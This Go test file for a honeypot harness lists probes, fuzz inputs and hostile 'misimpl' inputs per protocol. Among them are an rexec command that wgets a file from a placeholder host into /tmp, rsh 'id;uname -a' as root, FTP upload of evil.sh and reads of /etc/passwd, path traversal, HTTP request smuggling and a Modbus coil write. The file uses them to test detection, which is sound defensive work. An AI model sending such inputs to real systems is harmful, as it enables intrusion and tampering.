package testharness

import (
	"bytes"
	"strings"
)

// protoSpec carries the protocol knowledge the smart cases need: a benign
// probe, what a healthy response looks like (unit + emulate/compatibility),
// protocol-aware malformed inputs (smart fuzz), and deliberately mis-framed
// inputs the honeypot should flag (misimpl, with the anomaly marker to verify).
type protoSpec struct {
	// ServerFirst: the service speaks before the client (ssh/ftp/smtp/telnet).
	ServerFirst bool
	// NoReply marks an accept-only service (e.g. syslog) that records what it
	// is sent without ever answering. unit/banner + emulate treat an empty
	// response as healthy for these instead of a missing-banner finding.
	NoReply bool
	// Probe is a benign, well-formed request to elicit a response (nil when
	// ServerFirst and no follow-up is needed).
	Probe []byte
	// Banner substrings a healthy response/greeting should contain (unit).
	Banner []string
	// EmulateOK validates a response for protocol compatibility.
	EmulateOK func(resp []byte) bool
	// Smart are protocol-aware malformed inputs (fuzz-smart).
	Smart []namedBytes
	// Misimpl are wrong-framing inputs; Anomaly is the marker the honeypot
	// should record (verified via the API when configured).
	Misimpl []misCase
}

type namedBytes struct {
	Name  string
	Bytes []byte
}

type misCase struct {
	Name    string
	Bytes   []byte
	Anomaly string // expected anomaly marker (for API verification), "" = any detection
}

func containsAll(resp []byte, subs []string) bool {
	for _, s := range subs {
		if !bytes.Contains(resp, []byte(s)) {
			return false
		}
	}
	return true
}
func startsWith(resp []byte, s string) bool { return strings.HasPrefix(string(resp), s) }

// specs maps a handler/protocol name to its spec. Endpoints name their handler
// (informational in network mode); unknown handlers fall back to generic
// (port-open + dumb fuzz only).
var specs = map[string]protoSpec{
	"http": {
		Probe:     []byte("GET / HTTP/1.0\r\nHost: probe\r\n\r\n"),
		Banner:    []string{"HTTP/"},
		EmulateOK: func(r []byte) bool { return startsWith(r, "HTTP/") && bytes.Contains(r, []byte(" ")) },
		Smart: []namedBytes{
			{"oversized-uri", []byte("GET /" + strings.Repeat("A", 9000) + " HTTP/1.0\r\n\r\n")},
			{"huge-content-length", []byte("POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 999999999\r\n\r\n")},
			{"many-headers", []byte("GET / HTTP/1.1\r\nHost: x\r\n" + strings.Repeat("X-H: y\r\n", 500) + "\r\n")},
			{"te-cl-smuggle", []byte("POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n")},
		},
		Misimpl: []misCase{
			{"unknown-method", []byte("FROBNICATE / HTTP/1.1\r\nHost: x\r\n\r\n"), "http-method-unknown"},
			{"binary-request-line", append([]byte{0x00, 0x01, 0x02}, []byte(" / HTTP/1.1\r\n\r\n")...), "http-request-line-non-printable"},
		},
	},
	"https": {Probe: []byte("GET / HTTP/1.0\r\n\r\n"), Banner: []string{"HTTP/"}, EmulateOK: func(r []byte) bool { return len(r) > 0 }},
	"ssh": {
		ServerFirst: true,
		Probe:       []byte("SSH-2.0-tarpit-harness\r\n"),
		Banner:      []string{"SSH-"},
		EmulateOK:   func(r []byte) bool { return startsWith(r, "SSH-2.0") || startsWith(r, "SSH-1") },
		Smart: []namedBytes{
			{"overlong-id", []byte("SSH-2.0-" + strings.Repeat("A", 9000) + "\r\n")},
			{"non-printable-id", []byte("SSH-2.0-\x00\x01\x02\r\n")},
		},
		Misimpl: []misCase{
			{"not-ssh", []byte("HELLO-NOT-SSH\r\n"), "ssh-id-not-ssh"},
			{"non-printable", []byte("SSH-2.0-\x00\x00\x00\x00\r\n"), "ssh-id-non-printable"},
		},
	},
	"ftp": {
		ServerFirst: true, Probe: []byte("USER anonymous\r\n"), Banner: []string{"220"},
		EmulateOK: func(r []byte) bool { return startsWith(r, "220") },
		Smart: []namedBytes{
			{"overlong-user", []byte("USER " + strings.Repeat("A", 4000) + "\r\n")},
			{"binary-command", append([]byte{0x00, 0x01, 0x02, 0xff}, []byte(" anonymous\r\n")...)},
			{"traversal-arg", []byte("RETR " + strings.Repeat("../", 2000) + "etc/passwd\r\n")},
		},
		// The decoy accepts the second PASS so post-auth intent surfaces; an
		// upload/download then is a malware-drop / exfil attempt it flags.
		Misimpl: []misCase{
			{"upload-attempt", []byte("USER anonymous\r\nPASS x\r\nPASS x\r\nSTOR /tmp/evil.sh\r\nQUIT\r\n"), "ftp-upload-attempt"},
			{"download-attempt", []byte("USER anonymous\r\nPASS x\r\nPASS x\r\nRETR /etc/passwd\r\nQUIT\r\n"), "ftp-download-attempt"},
		},
	},
	"smtp_recv": {
		ServerFirst: true, Probe: []byte("EHLO probe\r\n"), Banner: []string{"220"},
		EmulateOK: func(r []byte) bool { return startsWith(r, "220") },
		Smart: []namedBytes{
			{"overlong-helo", []byte("EHLO " + strings.Repeat("A", 4000) + "\r\n")},
			{"binary-command", append([]byte{0x00, 0x01, 0x02}, []byte(" MAIL FROM:<a>\r\n")...)},
			{"rcpt-flood", []byte(strings.Repeat("RCPT TO:<a@b>\r\n", 200))},
		},
	},
	"telnet": {
		ServerFirst: true, Banner: nil, EmulateOK: func(r []byte) bool { return len(r) > 0 },
		Smart: []namedBytes{
			{"iac-do-storm", bytes.Repeat([]byte{0xff, 0xfd, 0x01}, 300)},
			{"overlong-line", []byte(strings.Repeat("A", 4000) + "\r\n")},
			{"binary-creds", append([]byte("root\r\n"), bytes.Repeat([]byte{0x00, 0x01}, 100)...)},
		},
		// username then a password full of control bytes — flagged as a
		// non-printable credential (a tell of a raw protocol/exploit probe).
		Misimpl: []misCase{
			{"binary-credentials", []byte("root\r\n\x00\x01\x02\x03\r\n"), "telnet-credential-non-printable"},
		},
	},
	"redis": {
		Probe: []byte("PING\r\n"),
		EmulateOK: func(r []byte) bool {
			return bytes.Contains(r, []byte("PONG")) || startsWith(r, "-") || startsWith(r, "+")
		},
		Smart: []namedBytes{
			{"giant-multibulk", []byte("*99999999\r\n")},
			{"giant-bulklen", []byte("$99999999\r\n")},
			{"inline-overlong", []byte("GET " + strings.Repeat("A", 5000) + "\r\n")},
		},
	},
	"sip_tcp": sipSpec(),
	"modbus": {
		Probe:     []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01}, // read coils
		EmulateOK: func(r []byte) bool { return len(r) >= 8 && r[0] == 0x00 && r[1] == 0x01 },
		Smart: []namedBytes{
			{"bad-length", []byte{0x00, 0x01, 0x00, 0x00, 0xff, 0xff, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01}},
			{"bad-function", []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x66, 0x00, 0x00, 0x00, 0x01}},
		},
		Misimpl: []misCase{
			{"write-single-coil", []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x00, 0xff, 0x00}, "modbus-write-attempt"},
		},
	},
	// BSD rlogin (513/tcp). Client-first: it opens with a NUL-separated record
	// "\0client-user\0server-user\0term/speed\0"; the decoy answers 0x00 then a
	// password prompt. Any connection is flagged rlogin-attempt.
	"rlogin": {
		Probe:     []byte("\x00rprobe\x00rprobe\x00xterm/38400\x00"),
		EmulateOK: func(r []byte) bool { return len(r) > 0 && (r[0] == 0x00 || bytes.Contains(r, []byte("Password"))) },
		Smart: []namedBytes{
			{"overlong-user", []byte("\x00rprobe\x00" + strings.Repeat("A", 4000) + "\x00xterm\x00")},
			{"no-nulls", []byte("not-an-rlogin-record\r\n")},
		},
		Misimpl: []misCase{
			{"connect", []byte("\x00probe\x00probe\x00xterm\x00"), "rlogin-attempt"},
		},
	},
	// BSD rsh (514/tcp). Client-first record "stderr_port\0local\0remote\0cmd\0";
	// the decoy answers 0x01 + "Permission denied." Any connection is
	// rsh-attempt; a non-empty command is rsh-command.
	"rsh": {
		Probe: []byte("0\x00rprobe\x00rprobe\x00\x00"),
		EmulateOK: func(r []byte) bool {
			return len(r) > 0 && (r[0] == 0x01 || bytes.Contains(r, []byte("Permission denied")))
		},
		Smart: []namedBytes{
			{"overlong-user", []byte("0\x00" + strings.Repeat("A", 4000) + "\x00root\x00\x00")},
			{"no-nulls", []byte("not-an-rsh-record\r\n")},
		},
		Misimpl: []misCase{
			{"command", []byte("0\x00root\x00root\x00id;uname -a\x00"), "rsh-command"},
		},
	},
	// BSD rexec (512/tcp). Like rsh but the record carries a cleartext password:
	// "stderr_port\0user\0pass\0cmd\0". rexec-attempt on any connection,
	// rexec-command when a command is present.
	"rexec": {
		Probe: []byte("0\x00rprobe\x00rprobe\x00\x00"),
		EmulateOK: func(r []byte) bool {
			return len(r) > 0 && (r[0] == 0x01 || bytes.Contains(r, []byte("Permission denied")))
		},
		Smart: []namedBytes{
			{"overlong-pass", []byte("0\x00root\x00" + strings.Repeat("A", 4000) + "\x00\x00")},
			{"no-nulls", []byte("not-an-rexec-record\r\n")},
		},
		Misimpl: []misCase{
			{"command", []byte("0\x00root\x00toor\x00wget http://x/m -O /tmp/m\x00"), "rexec-command"},
		},
	},
	// TFTP (69/udp). Client-first: RRQ/WRQ "opcode(2)|filename\0mode\0". The
	// decoy answers ERROR(5) access-violation; a WRQ is a tftp-write-attempt and
	// an RRQ for a device config file is tftp-config-read.
	"tftp": {
		Probe:     []byte("\x00\x01probe.txt\x00octet\x00"),
		Banner:    []string{"Access violation"},
		EmulateOK: func(r []byte) bool { return len(r) >= 4 && r[0] == 0x00 && r[1] == 0x05 },
		Smart: []namedBytes{
			{"bad-opcode", []byte("\x00\x09probe\x00octet\x00")},
			{"truncated", []byte("\x00\x01ab")},
			{"overlong-filename", []byte("\x00\x01" + strings.Repeat("A", 5000) + "\x00octet\x00")},
		},
		Misimpl: []misCase{
			{"write-attempt", []byte("\x00\x02upload.bin\x00octet\x00"), "tftp-write-attempt"},
			{"config-read", []byte("\x00\x01running-config\x00octet\x00"), "tftp-config-read"},
		},
	},
	// Syslog over TCP (RFC 6587). Accept-only: it records messages and never
	// answers, so NoReply makes unit/emulate treat an empty response as healthy.
	"syslog_tcp": {
		Probe:     []byte("<13>probe: tarpit-harness syslog test\n"),
		NoReply:   true,
		EmulateOK: func(r []byte) bool { return true },
		Smart: []namedBytes{
			{"oversized-msg", []byte("<13>" + strings.Repeat("A", 6000) + "\n")},
			{"binary-msg", append([]byte("<13>"), bytes.Repeat([]byte{0x00, 0x01, 0x02}, 200)...)},
			{"octet-count-overflow", []byte("99999999 " + strings.Repeat("B", 64))},
		},
	},
	// Syslog over UDP (RFC 3164/5424), one message per datagram. Accept-only.
	"syslog_udp": {
		Probe:     []byte("<13>probe: tarpit-harness syslog test"),
		NoReply:   true,
		EmulateOK: func(r []byte) bool { return true },
		Smart: []namedBytes{
			{"oversized-msg", []byte("<13>" + strings.Repeat("A", 6000))},
			{"binary-msg", append([]byte("<13>"), bytes.Repeat([]byte{0x00, 0x01, 0x02}, 200)...)},
			{"empty-pri", []byte("<>no pri value")},
		},
	},
	// IMAP4 (143/tcp). Server-first "* OK" greeting; a follow-up command
	// exercises the parser. LOGIN/AUTHENTICATE harvest mail credentials.
	"imap": {
		ServerFirst: true, Probe: []byte("a1 CAPABILITY\r\n"), Banner: []string{"* OK"},
		EmulateOK: func(r []byte) bool { return startsWith(r, "* OK") || bytes.Contains(r, []byte("CAPABILITY")) },
		Smart: []namedBytes{
			{"overlong-tag", []byte(strings.Repeat("a", 5000) + " CAPABILITY\r\n")},
			{"huge-literal", []byte("a1 LOGIN {999999999}\r\n")},
			{"binary-command", append([]byte("a1 "), bytes.Repeat([]byte{0x00, 0x01, 0x02}, 100)...)},
		},
		Misimpl: []misCase{{"not-imap", []byte("GET / HTTP/1.0\r\n\r\n"), ""}},
	},
	// POP3 (110/tcp). Server-first "+OK" greeting; USER/PASS + SASL harvest creds.
	"pop3": {
		ServerFirst: true, Probe: []byte("CAPA\r\n"), Banner: []string{"+OK"},
		EmulateOK: func(r []byte) bool { return startsWith(r, "+OK") },
		Smart: []namedBytes{
			{"overlong-user", []byte("USER " + strings.Repeat("A", 5000) + "\r\n")},
			{"binary-command", append([]byte{0x00, 0x01, 0x02}, []byte(" USER x\r\n")...)},
		},
		Misimpl: []misCase{{"not-pop3", []byte("GET / HTTP/1.0\r\n\r\n"), ""}},
	},
	// MySQL (3306/tcp). Server-first binary handshake: a 4-byte packet header
	// then protocol version 0x0a.
	"mysql": {
		ServerFirst: true,
		EmulateOK:   func(r []byte) bool { return len(r) >= 5 && r[4] == 0x0a },
		Smart: []namedBytes{
			{"oversized-login", append([]byte{0xff, 0xff, 0xff, 0x01}, bytes.Repeat([]byte{0x41}, 600)...)},
			{"bad-length", []byte{0xff, 0xff, 0xff, 0x00}},
		},
		Misimpl: []misCase{{"http-to-mysql", []byte("GET / HTTP/1.0\r\n\r\n"), ""}},
	},
	// PostgreSQL (5432/tcp). Client-first: an SSLRequest is answered with a
	// single-byte 'N' (TLS unavailable).
	"postgres": {
		Probe:     []byte{0x00, 0x00, 0x00, 0x08, 0x04, 0xd2, 0x16, 0x2f},
		EmulateOK: func(r []byte) bool { return len(r) >= 1 && (r[0] == 'N' || r[0] == 'S' || r[0] == 'E' || r[0] == 'R') },
		Smart: []namedBytes{
			{"oversized-startup", append([]byte{0x00, 0x00, 0xff, 0xff, 0x00, 0x03, 0x00, 0x00}, bytes.Repeat([]byte{0x41}, 300)...)},
			{"bad-length", []byte{0xff, 0xff, 0xff, 0xff}},
		},
		Misimpl: []misCase{{"http-to-postgres", []byte("GET / HTTP/1.0\r\n\r\n"), ""}},
	},
	// VNC / RFB (5900/tcp). Server-first version string "RFB 003.008\n".
	"vnc": {
		ServerFirst: true, Probe: []byte("RFB 003.008\n"), Banner: []string{"RFB "},
		EmulateOK: func(r []byte) bool { return startsWith(r, "RFB ") },
		Smart: []namedBytes{
			{"bad-version", []byte("RFB 999.999\n")},
			{"short-version", []byte("RFB\n")},
			{"binary-version", append([]byte("RFB "), bytes.Repeat([]byte{0x00}, 64)...)},
		},
		Misimpl: []misCase{{"http-to-vnc", []byte("GET / HTTP/1.0\r\n\r\n"), ""}},
	},
	// memcached (11211/tcp), text protocol. "version" returns "VERSION x.y.z".
	"memcached": {
		Probe:     []byte("version\r\n"),
		Banner:    []string{"VERSION"},
		EmulateOK: func(r []byte) bool { return bytes.Contains(r, []byte("VERSION")) || bytes.Contains(r, []byte("ERROR")) },
		Smart: []namedBytes{
			{"oversized-get", []byte("get " + strings.Repeat("k", 5000) + "\r\n")},
			{"huge-set", []byte("set x 0 0 999999999\r\n")},
			{"binary", []byte{0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
		},
		Misimpl: []misCase{{"http-to-memcached", []byte("GET / HTTP/1.0\r\n\r\n"), ""}},
	},
	// MQTT (1883/tcp). Client-first: a CONNECT is answered with CONNACK (0x20);
	// the decoy harvests CONNECT username/password.
	"mqtt": {
		Probe:     mqttConnectProbe(),
		EmulateOK: func(r []byte) bool { return len(r) >= 2 && r[0] == 0x20 },
		Smart: []namedBytes{
			{"oversize-remlen", []byte{0x10, 0xff, 0xff, 0xff, 0x7f}},
			{"bad-proto-name", []byte{0x10, 0x0a, 0x00, 0x04, 'X', 'X', 'X', 'X', 0x04, 0x02, 0x00, 0x3c}},
			{"truncated", []byte{0x10, 0x02, 0x00}},
		},
		Misimpl: []misCase{{"text-to-mqtt", []byte("GET / HTTP/1.0\r\n\r\n"), ""}},
	},
	// LDAP (389/tcp). Client-first BER: an anonymous simple bind is answered
	// with a bindResponse (LDAPMessage SEQUENCE, tag 0x30).
	"ldap": {
		Probe:     []byte{0x30, 0x0c, 0x02, 0x01, 0x01, 0x60, 0x07, 0x02, 0x01, 0x03, 0x04, 0x00, 0x80, 0x00},
		EmulateOK: func(r []byte) bool { return len(r) >= 2 && r[0] == 0x30 },
		Smart: []namedBytes{
			{"bad-ber-length", []byte{0x30, 0x84, 0xff, 0xff, 0xff, 0xff}},
			{"truncated-bind", []byte{0x30, 0x0c, 0x02, 0x01, 0x01, 0x60}},
			{"overlong-dn", append([]byte{0x30, 0x82, 0x10, 0x00, 0x02, 0x01, 0x01, 0x60, 0x07, 0x02, 0x01, 0x03, 0x04, 0x00, 0x80, 0x00}, bytes.Repeat([]byte{0x41}, 200)...)},
		},
		Misimpl: []misCase{{"http-to-ldap", []byte("GET / HTTP/1.0\r\n\r\n"), ""}},
	},
}

// mqttConnectProbe builds a minimal MQTT 3.1.1 CONNECT packet (clean session,
// no auth) for the emulate/unit probe; a broker answers it with CONNACK.
func mqttConnectProbe() []byte {
	vh := []byte{0x00, 0x04, 'M', 'Q', 'T', 'T', 0x04, 0x02, 0x00, 0x3c}
	cid := []byte{0x00, 0x07, 'h', 'a', 'r', 'n', 'e', 's', 's'}
	body := append(append([]byte{}, vh...), cid...)
	return append([]byte{0x10, byte(len(body))}, body...)
}

func sipSpec() protoSpec {
	opt := "OPTIONS sip:probe@target SIP/2.0\r\n" +
		"Via: SIP/2.0/TCP 127.0.0.1:5060;branch=z9hG4bKprobe\r\n" +
		"From: <sip:probe@t>;tag=1\r\nTo: <sip:probe@t>\r\nCall-ID: probe@t\r\n" +
		"CSeq: 1 OPTIONS\r\nMax-Forwards: 70\r\nContent-Length: 0\r\n\r\n"
	invite := strings.Replace(strings.Replace(opt, "OPTIONS", "INVITE", 2), "1 OPTIONS", "1 INVITE", 1)
	return protoSpec{
		Probe:     []byte(opt),
		Banner:    []string{"SIP/2.0"},
		EmulateOK: func(r []byte) bool { return bytes.Contains(r, []byte("SIP/2.0")) },
		Smart: []namedBytes{
			{"no-headers", []byte("OPTIONS sip:x SIP/2.0\r\n\r\n")},
			{"giant-cseq", []byte("OPTIONS sip:x SIP/2.0\r\nCSeq: " + strings.Repeat("9", 5000) + " OPTIONS\r\n\r\n")},
		},
		Misimpl: []misCase{
			{"invite-scan", []byte(invite), "sip-invite-attempt"},
		},
	}
}

// specFor returns the protocol spec for an endpoint (by handler), and whether
// one is known.
func specFor(e Endpoint) (protoSpec, bool) {
	s, ok := specs[e.Handler]
	return s, ok
}
